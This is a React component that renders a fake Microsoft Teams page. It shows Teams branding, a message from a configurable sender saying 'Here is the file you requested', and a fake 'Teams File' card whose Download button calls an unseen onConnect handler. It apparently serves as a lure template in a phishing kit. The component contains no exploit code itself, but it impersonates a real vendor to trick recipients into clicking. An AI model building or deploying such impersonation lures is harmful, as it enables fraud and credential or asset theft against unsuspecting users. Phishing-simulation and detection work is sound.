"use client";

import { Loader2 } from "lucide-react";

interface TemplateProps {
  documentTitle: string;
  docType: string;
  senderName: string;
  onConnect: () => void;
  connecting: boolean;
}

export default function TeamsTemplate({
  documentTitle,
  docType,
  senderName,
  onConnect,
  connecting,
}: TemplateProps) {
  return (
    <div
      style={{
        minHeight: "100vh",
        backgroundColor: "#1b1b1b",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
      }}
    >
      {/* Header */}
      <div
        style={{
          width: "100%",
          padding: "14px 24px",
          backgroundColor: "#464775",
          display: "flex",
          alignItems: "center",
          gap: 10,
        }}
      >
        <svg width="24" height="24" viewBox="0 0 24 24" fill="none">
          <rect x="3" y="5" width="14" height="14" rx="2" fill="#fff" opacity="0.9" />
          <text x="7" y="15" fontSize="9" fill="#464775" fontWeight="bold">T</text>
          <circle cx="19" cy="8" r="4" fill="#fff" opacity="0.7" />
        </svg>
        <span style={{ color: "#fff", fontSize: 16, fontWeight: 600 }}>Microsoft Teams</span>
      </div>

      {/* Chat area */}
      <div
        style={{
          maxWidth: 560,
          width: "100%",
          margin: "40px auto 0",
          padding: "0 16px",
        }}
      >
        {/* Chat message bubble */}
        <div style={{ display: "flex", gap: 12, marginBottom: 24 }}>
          <div
            style={{
              width: 36,
              height: 36,
              borderRadius: "50%",
              backgroundColor: "#464775",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              color: "#fff",
              fontSize: 14,
              fontWeight: 600,
              flexShrink: 0,
            }}
          >
            {senderName.charAt(0).toUpperCase()}
          </div>
          <div style={{ flex: 1 }}>
            <div style={{ display: "flex", alignItems: "baseline", gap: 8, marginBottom: 6 }}>
              <span style={{ color: "#e0e0e0", fontSize: 14, fontWeight: 600 }}>
                {senderName}
              </span>
              <span style={{ color: "#808080", fontSize: 11 }}>
                {new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
              </span>
            </div>
            <p style={{ color: "#c0c0c0", fontSize: 13, marginBottom: 12 }}>
              Here is the file you requested
            </p>

            {/* File attachment card */}
            <div
              style={{
                backgroundColor: "#2d2d2d",
                borderRadius: 8,
                border: "1px solid #404040",
                overflow: "hidden",
              }}
            >
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: 12,
                  padding: 16,
                }}
              >
                <div
                  style={{
                    width: 40,
                    height: 48,
                    borderRadius: 4,
                    backgroundColor:
                      docType === "PDF"
                        ? "#E74C3C"
                        : docType === "DOCX"
                          ? "#2B579A"
                          : docType === "XLSX"
                            ? "#217346"
                            : docType === "PPTX"
                              ? "#D24726"
                              : "#464775",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                    color: "#fff",
                    fontSize: 10,
                    fontWeight: 700,
                  }}
                >
                  {docType}
                </div>
                <div>
                  <p style={{ color: "#e0e0e0", fontSize: 14, fontWeight: 500 }}>
                    {documentTitle}
                  </p>
                  <p style={{ color: "#808080", fontSize: 11, marginTop: 2 }}>
                    {docType} &middot; Teams File
                  </p>
                </div>
              </div>

              <button
                onClick={onConnect}
                disabled={connecting}
                style={{
                  width: "100%",
                  padding: "10px",
                  backgroundColor: connecting ? "#3a3b5c" : "#464775",
                  color: "#fff",
                  border: "none",
                  borderTop: "1px solid #404040",
                  fontSize: 13,
                  fontWeight: 600,
                  cursor: connecting ? "not-allowed" : "pointer",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 8,
                }}
              >
                {connecting && <Loader2 className="h-4 w-4 animate-spin" />}
                {connecting ? "Opening..." : "Download"}
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
